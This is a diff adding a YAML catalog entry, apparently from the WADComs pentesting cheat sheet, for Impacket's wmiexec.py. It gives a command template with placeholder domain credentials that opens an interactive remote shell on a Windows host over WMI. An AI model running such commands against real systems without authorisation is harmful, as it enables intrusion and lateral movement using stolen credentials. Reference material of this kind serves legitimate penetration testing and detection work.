@@ -1,0 +1,30 @@
+id: wadcoms/impacket-wmiexec
+type: technique
+platform: active-directory
+name: Impacket WMIExec
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 wmiexec.py test.local/john:password123@10.10.10.1
+  comment: 'Impacket''s wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive
+    shell on the Windows host. Command Reference: Target IP: 10.10.10.1 Domain: test.local Username: john
+    Password: password123'
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+- https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy
+tags:
+- active-directory
+- wadcoms
+- wmi
